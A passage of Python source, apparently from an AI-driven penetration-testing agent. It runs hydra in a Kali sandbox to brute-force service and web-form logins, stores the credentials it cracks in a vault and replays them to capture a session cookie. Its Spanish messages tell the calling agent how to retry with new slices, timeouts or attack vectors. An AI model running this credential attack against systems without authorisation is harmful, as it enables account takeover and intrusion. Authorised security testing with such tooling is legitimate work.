        wordlist_path,
        "-s",
        str(port),
        "-t",
        str(CRED_TASKS),
        "-f",
        "-I",
        "-o",
        outfile_path,
    ]
    if service in CRED_FORM_SERVICES and secure:
        argv.append("-S")
    if form_spec:
        argv.extend([target, service, form_spec])
    else:
        argv.append(f"{service}://{target}")
    sandbox = sandbox_for_environment(workspace_root, allowed_programs=CRED_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_HYDRA_IMAGE",
        default_image="kalilinux/kali-rolling",
    )

    combined = "\n".join([result.stdout or "", result.stderr or ""])
    credentials = parse_hydra_credentials(combined)
    if not credentials and os.path.isfile(outfile_path):
        try:
            with open(outfile_path, encoding="utf-8", errors="replace") as handle:
                credentials = parse_hydra_credentials(handle.read(1_000_000))
        except OSError:
            credentials = []

    evidence: dict[str, Any] = {
        "service": service,
        "port": port,
        "username": username,
        "attempts": attempts,
        "max_attempts": max_attempts,
        "start_at": start_at,
        "next_start_at": start_at + attempts,
        "slice_exhausted": exhausted,
        "found_count": len(credentials),
        "noise_level": "medium",
        "timeout_seconds": timeout_seconds,
    }
    if form_spec:
        # The route, never the template: the form params carry the operator's
        # passwords only as hydra placeholders, but the path is what the board
        # needs to tie the attempt to the endpoint.
        evidence["form_url"] = form_path
        if form_query_dropped:
            evidence["form_query_dropped"] = form_query_dropped
        if form_params_autofill:
            # The caller's params were completed, not replaced: the field and the
            # placeholder that were added travel with the verdict.
            evidence["form_params_autofill"] = form_params_autofill
        # ``ok`` means the marker was probed and separates a failed login from
        # the page itself; ``skipped`` is infrastructure, not a verdict.
        evidence["failure_string_probe"] = probe.status
        if probe.reason:
            evidence["failure_string_probe_reason"] = probe.reason

    # V1-29: the plaintext is stored, never forwarded. What the loop, the
    # blackboard and the prompt see is the handle.
    stored = store_discovered_credentials(credentials, tenant_id=context.tenant_id)
    evidence["secret_refs"] = [entry["secret_ref"] for entry in stored if entry.get("secret_ref")]
    stdout = _scrub_plaintext(result.stdout or "", credentials)
    stderr = _scrub_plaintext(result.stderr or "", credentials)
    # A validated *form* credential is worth nothing until the panel session it
    # opens travels with it: login once more, keep the cookie in the vault and
    # hand the caller its handle.
    session: dict[str, Any] | None = None
    if stored and form_spec:
        winner = credentials[0]
        session = await _capture_form_session(
            target=target, port=port, secure=secure, path=form_path,
            form_params=form_params, failure_string=failure_string,
            username=str(winner.get("username") or username),
            password=str(winner.get("password") or ""),
            service=service, workspace_root=workspace_root,
            tenant_id=context.tenant_id,
        )
        evidence["session_verified"] = bool(session.get("verified"))
        if session.get("reason"):
            evidence["session_reason"] = session["reason"]

    if _hydra_unavailable(result.exit_code, result.stderr or ""):
        # hydra never ran: the target was not contacted, so this is not a verdict
        # about the credentials (never ``negative``) and not a modelling slip.
        # ``unavailable`` is the determinate classification the loop counts and
        # retires, and the message names the only fix there is.
        evidence["hydra_available"] = False
        return ToolResult(
            output={
                "error": "hydra is not available in the sandbox",
                "message": (
                    "Hydra no está instalado o no arrancó en el sandbox: el "
                    "objetivo no se contactó y no hay veredicto sobre las "
                    "credenciales. Instálalo con nexus.system.install o usa otra "
                    "ruta."
                ),
                "target": target,
                "service": service,
                "port": port,
            },
            verified=False,
            outcome="unavailable",
            verification_method="cred_bruteforce_unavailable",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=stdout,
            stderr=stderr,
        )

    if result.timed_out and not stored:
        # The budget ended before the wordlist did. That is *not* a verdict about
        # the target, so no ``barrier`` is recorded: the route stays open for a
        # longer sweep, a sliced list or a bigger budget instead of being closed
        # forever by an internal timer. ``outcome="timeout"`` keeps the gateway
        # reading it as a declared budget of this tool (determinate, retirable).
        evidence["wordlist_completed"] = False
        return ToolResult(
            output={
                "error": "credential testing timed out",
                "aborted": "time_cap",
                "message": (
                    f"Hydra se cortó a los {timeout_seconds}s sin credencial "
                    f"válida: la wordlist no terminó ({attempts} intentos "
                    "preparados). No es un veredicto sobre el objetivo: sube "
                    "timeout_seconds, baja max_attempts (el barrido va por "
                    "slices con start_at) o cambia de vector."
                ),
                "target": target,
                "service": service,
                "port": port,
                "attempts": attempts,
                "timeout_seconds": timeout_seconds,
            },
            verified=False,
            outcome="timeout",
            verification_method="cred_bruteforce_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=stdout,
            stderr=stderr,
            timed_out=True,
        )

    verified = bool(stored)
    # A sweep that ran to the end and found nothing is an *observation* about the
    # target (V0-22), not a tool defect: it completes with ``negative`` and the
    # branch is closed with a barrier so the next turn pivots instead of repeating
    # the same wordlist. hydra's own closing line travels in the output, because
    # "0 valid password found" and "[ERROR] could not connect" are different
    # facts and only the first one means the credentials were disproved.
    #
    # A slice that ended while the list still has entries is neither: it decided
    # something about the slice, not about the target, so it completes as
    # ``partial`` (no barrier, no verdict) and names where the next slice starts.
    partial = not stored and not result.timed_out and not exhausted
    negative = not stored and not result.timed_out and exhausted
    verdict = _hydra_verdict(combined) if (negative or partial) else ""
    completed_sweep = "password found" in verdict.lower()
    if negative:
        reason = (
            f"fuerza bruta {service} sobre {target}:{port} sin credencial válida "
            f"tras {attempts} intentos ({timeout_seconds}s de presupuesto)"
        )
        evidence["barrier_recorded"] = _record_brute_barrier(
            context,
            target=target,
            port=port,
            reason=reason,
            detail={"service": service, "attempts": attempts},
        )
        evidence["wordlist_completed"] = completed_sweep
    elif partial:
        evidence["wordlist_completed"] = False
    result_output: dict[str, Any] = {
        "target": target,
        "service": service,
        "port": port,
        "username": username,
        "attempts": attempts,
        "start_at": start_at,
        "next_start_at": start_at + attempts,
        "wordlist_completed": (exhausted and not result.timed_out),
        "valid_credentials": stored,
    }
    if session is not None:
        result_output["session"] = session
    if negative:
        result_output["message"] = (
            "Hydra completó el ataque sin encontrar credenciales válidas"
            if completed_sweep
            else "Hydra terminó el barrido sin credenciales válidas"
        )
        if verdict:
            result_output["hydra_verdict"] = verdict
    elif partial:
        result_output["message"] = (
            f"Slice sin acierto: se probaron {attempts} entradas desde el offset "
            f"{start_at} y la wordlist tiene más. Repite la llamada con "
            f"start_at={start_at + attempts} para el siguiente slice (no hay "
            "veredicto sobre el objetivo todavía)."
        )
        if verdict:
            result_output["hydra_verdict"] = verdict
    return ToolResult(
        output=result_output,
        verified=verified,
        outcome="" if verified else ("partial" if partial else ("negative" if negative else "")),
        verification_method="cred_bruteforce_completed",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=stdout,
        stderr=stderr,
    )
